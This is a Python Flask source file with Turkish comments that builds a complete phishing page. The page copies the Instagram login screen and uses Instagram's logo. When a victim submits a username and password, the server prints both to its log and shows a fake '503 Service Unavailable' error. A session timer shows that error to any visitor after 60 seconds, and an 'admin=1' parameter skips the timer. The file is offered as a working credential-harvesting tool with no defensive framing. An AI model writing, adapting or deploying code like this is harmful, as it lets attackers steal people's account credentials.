import os
from flask import Flask, request, render_template_string, session
from datetime import datetime, timedelta

app = Flask(__name__)
app.secret_key = 'cok_gizli_bir_key' # Bu satır olmazsa hata verir

# --- INSTAGRAM TASARIMI ---
HTML_KODU = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş Yap • Instagram</title>
    <style>
        body { font-family: -apple-system, system-ui, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; }
        .logo { width: 175px; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; }
        button { width: 100%; padding: 7px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2511109452.png" class="logo">
        <form method="POST" action="/login">
            <input type="text" name="u" placeholder="Kullanıcı adı" required>
            <input type="password" name="p" placeholder="Şifre" required>
            <button type="submit">Giriş Yap</button>
        </form>
    </div>
</body>
</html>
"""

HATA_SAYFASI = """<h1 style='text-align:center;margin-top:100px;'>503 Service Unavailable</h1>"""

@app.route('/')
def home():
    # Admin isen sınırsız giriş
    if request.args.get('admin') == '1':
        return render_template_string(HTML_KODU)

    # İlk defa giren kişi için süre başlat
    if 'baslangic' not in session:
        session['baslangic'] = datetime.now().timestamp()
    
    gecen_sure = datetime.now().timestamp() - session['baslangic']
    
    # 60 saniye dolduysa hata ver
    if gecen_sure > 60:
        return HATA_SAYFASI, 503
    
    return render_template_string(HTML_KODU)

@app.route('/login', methods=['POST'])
def login():
    print(f"VERI: {request.form.get('u')} | {request.form.get('p')}")
    return HATA_SAYFASI, 503

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
